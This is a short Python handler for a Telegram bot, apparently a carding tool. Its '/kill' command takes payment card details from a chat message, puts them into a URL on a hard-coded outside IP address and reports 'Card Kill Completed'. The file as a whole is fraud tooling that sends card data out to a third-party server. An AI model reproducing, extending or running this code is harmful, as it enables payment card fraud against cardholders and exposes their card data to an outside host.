import requests
import time

# Base URL for card processing
BASE_URL = 'http://108.181.156.139:9300/process-cc?cc='

def handle_kill(bot, message):
    text = message.text.split(maxsplit=1)

    if len(text) < 2:
        bot.reply_to(message, "⚠️ *Usage:* `/kill <cc_details>`", parse_mode="Markdown")
        return

    cc_details = text[1]
    url = BASE_URL + cc_details

    # Send "Please Wait..." message and store its message ID
    wait_message = bot.reply_to(message, "⏳ *Please Wait...*", parse_mode="Markdown")
    start_time = time.time()

    try:
        response = requests.get(url)
        response.raise_for_status()
        response_text = response.text.strip()
    except requests.RequestException as e:
        response_text = f"Error: {e}"

    response_time = time.time() - start_time

    message_text = (
        f"✅ *Card Kill Completed*\n\n"
        f"🔹 *Response*: `{response_text}`\n\n"
        f"⏳ *Response Time*: `{response_time:.2f} seconds`\n\n"
        f"💳 *Status*: `Completed`"
    )

    # Delete "Please Wait..." message
    bot.delete_message(chat_id=message.chat.id, message_id=wait_message.message_id)

    # Send the final response
    bot.reply_to(message, message_text, parse_mode="Markdown")